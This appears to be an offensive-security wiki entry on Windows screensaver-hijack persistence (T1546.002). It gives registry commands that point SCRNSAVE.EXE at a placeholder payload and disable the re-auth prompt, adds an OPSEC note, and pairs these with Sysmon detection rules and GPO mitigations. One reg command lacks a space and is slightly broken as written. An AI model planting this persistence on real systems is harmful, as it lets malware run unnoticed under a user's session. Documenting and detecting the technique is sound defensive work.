---
title: Screensaver Persistence
slug: screensaver-persistence
---

> **TL;DR:** Point `HKCU\Control Panel\Desktop\SCRNSAVE.EXE` at a malicious binary and the user's session will execute it under `winlogon.exe` every time the idle timer fires — a per-user, no-admin persistence (MITRE T1546.002).

## What it is
Windows launches the program named in the per-user registry value `HKCU\Control Panel\Desktop\SCRNSAVE.EXE` whenever the inactivity timer in `ScreenSaveTimeout` elapses and `ScreenSaveActive` is `1`. The launcher is the user's `winlogon`/Desktop subsystem, so the payload inherits the interactive user's token. Any `.exe` works — the `.scr` extension is convention, not enforcement.

## Preconditions / where it applies
- Write access to the current user's `HKCU` hive (no admin required)
- Interactive logon session — does not fire for services, RDP-disconnected idle sessions still trigger after timeout
- Group policy may force these keys: GPO-managed hosts will overwrite attacker values on refresh

## Technique
Drop a payload, set the four registry values, and wait for idle. Setting `ScreenSaverIsSecure=0` ensures the dismissal does not gate the payload behind a re-auth prompt.

```cmd
reg add "HKCU\Control Panel\Desktop" /v SCRNSAVE.EXE     /t REG_SZ /d C:\Users\Public\evil.exe /f
reg add "HKCU\Control Panel\Desktop" /v ScreenSaveActive /t REG_SZ /d 1 /f
reg add "HKCU\Control Panel\Desktop" /v ScreenSaveTimeout/t REG_SZ /d 60 /f
reg add "HKCU\Control Panel\Desktop" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f
```

```powershell
Set-ItemProperty 'HKCU:\Control Panel\Desktop' SCRNSAVE.EXE 'C:\Users\Public\evil.exe'
Set-ItemProperty 'HKCU:\Control Panel\Desktop' ScreenSaveActive 1
```

OPSEC: the resulting process tree is `winlogon.exe -> scrnsave-binary`, which is anomalous for anything other than the stock `*.scr` files in `C:\Windows\System32`.

## Detection and defence
- Sysmon EID 13 (RegistryValueSet) on `\Control Panel\Desktop\SCRNSAVE.EXE` outside expected `%SystemRoot%\System32\*.scr`
- Sysmon EID 1 with `ParentImage` = `winlogon.exe` and `Image` not ending in `.scr` under `System32`
- GPO `Force specific screen saver` to lock the value; AppLocker / WDAC deny-list user-writable paths

## References
- [ired.team — Screensaver Hijack T1180](https://www.ired.team/offensive-security/persistence/t1180-screensaver-hijack) — original walkthrough
- [MITRE ATT&CK T1546.002 — Screensaver](https://attack.mitre.org/techniques/T1546/002/) — technique reference and detections
